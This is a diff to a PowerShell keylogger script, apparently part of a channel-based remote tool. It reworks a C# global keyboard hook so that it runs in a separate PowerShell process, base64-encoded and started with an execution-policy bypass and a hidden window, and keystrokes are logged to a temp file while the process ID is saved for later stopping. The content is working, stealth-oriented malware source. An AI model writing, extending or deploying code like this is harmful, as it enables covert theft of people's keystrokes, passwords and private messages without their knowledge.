@@ -2,10 +2,12 @@ param($args)
 
 $channelID = $env:ChannelID
 $logFile = "$env:TEMP\keylog_$channelID.txt"
-$jobFile = "$env:TEMP\keylog_job_$channelID.txt"
+$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
 
-# C# code for global keyboard hook with proper message pump
-$cSharpCode = @"
+# PowerShell script to run in background
+$scriptBlock = @"
+param(`$logFile)
+`$cSharpCode = @"
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -86,12 +88,26 @@ public class Keylogger
     private static extern IntPtr GetModuleHandle(string lpModuleName);
 }
 "@
+Add-Type -TypeDefinition `$cSharpCode -ReferencedAssemblies "System.Windows.Forms"
+[Keylogger]::Start(`$logFile)
+# Keep the process alive
+while(`$true) {
+    Start-Sleep -Seconds 10
+}
+"@
 
-# Compile and start in background thread
-Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms"
-[Keylogger]::Start($logFile)
+# Encode the script as a command to pass to new PowerShell process
+$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock))
 
-# Save the process ID for stopping
-$pid | Out-File -FilePath $jobFile
+# Start hidden PowerShell process
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell.exe"
+$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand -logFile `"$logFile`""
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi.CreateNoWindow = $true
+$p = [System.Diagnostics.Process]::Start($psi)
 
-Write-Output "Keylogger started. Logging to $logFile"
+# Save PID
+$p.Id | Out-File -FilePath $pidFile
+
+Write-Output "Keylogger started with PID $($p.Id). Logging to $logFile"
